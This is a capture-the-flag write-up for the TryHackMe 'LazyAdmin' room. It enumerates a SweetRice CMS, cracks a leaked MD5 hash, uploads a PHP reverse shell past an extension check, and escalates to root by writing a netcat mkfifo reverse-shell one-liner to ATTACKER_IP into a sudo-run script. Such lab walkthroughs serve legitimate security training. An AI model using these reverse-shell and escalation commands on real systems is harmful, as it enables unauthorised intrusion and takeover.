# [LazyAdmin](https://tryhackme.com/room/lazyadmin)

## Easy linux machine to practice your skills

### What is the user flag?

1. First, scan for open ports with `nmap` to identify available services

```bash
nmap IP
```

[SCREEN01]

2. Enumerate directories on the web server using `gobuster` to discover hidden content
   - We've discovered a `/content` directory. The web application is running `SweetRice`, a Content Management System

```bash
gobuster dir -u http://IP -w /root/Tools/wordlists/dirbuster/directory-list-2.3-medium.txt
```

[SCREEN02]

3. Scan `/content` directory to find additional resources
   - This reveals two interesting directories: `/content/inc/mysql_backup/` and `/content/as/`

```bash
gobuster dir -u http://IP/content -w /root/Tools/wordlists/dirbuster/directory-list-2.3-medium.txt
```

4. Investigating the `/content/inc/mysql_backup/` directory in the browser, we discover a database backup file `mysql_bakup_20191129023059-1.5.1.sql`
   - There are credentials for manager: `manager:42f749ade7f9e195bf475f37a44cafcb`

```bash
grep "admin" mysql_bakup_20191129023059-1.5.1.sql
```

[SCREEN03]

5. Crack this MD5 hash using [CrackStation](https://crackstation.net/) and login to `http://IP/content/as/`

[SCREEN04]

6. Create a [PHP reverse shell](https://github.com/mosec0/Reverse-Shell/blob/main/reverse-shell.php) and upload it to `http://IP/content/as/?type=media_center`. We need to change extension of the file to bypass validation

[SCREEN05]

7. Before triggering the shell (by clicking on the file), set up a netcat listener on our attack machine

8. Upgrade shell and get the user flag

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
cat /home/itguy/user.txt
```

[SCREEN06]

---

### What is the root flag?

1. Check what sudo permissions we have

```bash
sudo -l
```

[SCREEN07]

2. We can run `/usr/bin/perl` `/home/itguy/backup.pl` with sudo privileges

```bash
cat backup.pl
cat etc/copy.sh
```

[SCREEN08]

3. Set another listener and replace the ip in `etc/copy.sh` script with our own and run it

```bash
nc -lvnp 5554
```

```bash
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER_IP 5554 > /tmp/f" > /etc/copy.sh
sudo /usr/bin/perl /home/itguy/backup.pl
```

[SCREEN09]

4. Get the root flag

```bash
whoami
cat /root/root.txt
```

[SCREEN10]
